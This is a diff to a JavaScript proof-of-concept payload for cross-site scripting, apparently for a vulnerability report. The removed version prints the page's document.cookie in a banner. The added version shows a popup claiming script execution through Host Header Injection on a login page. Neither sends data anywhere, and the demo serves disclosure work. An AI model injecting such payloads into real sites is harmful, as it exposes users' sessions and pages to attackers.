@@ -1,4 +1,25 @@
-const div = document.createElement("div");
-div.style.cssText = "position:fixed;top:0;left:0;width:100%;padding:20px;background:#0a0;color:#fff;font-size:24px;z-index:999999;";
-div.innerHTML = "XSS PoC:<br>JS Executed Successfully.<br>document.cookie: \"" + document.cookie + "\"";
-document.body.appendChild(div);
+// Create an attacker-controlled popup (works on login page)
+const popup = document.createElement('div');
+
+popup.style.cssText = `
+    position: fixed;
+    top: 25%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #111;
+    color: #fff;
+    padding: 30px 40px;
+    font-size: 22px;
+    text-align: center;
+    border-radius: 12px;
+    z-index: 999999999;
+    box-shadow: 0 0 20px rgba(0,0,0,0.6);
+`;
+
+popup.innerHTML = `
+    <h2 style="margin-top:0">XSS PoC</h2>
+    <p>External JavaScript Executed via Host Header Injection.</p>
+    <p>This popup proves full DOM control on the login page.</p>
+`;
+
+document.body.appendChild(popup);
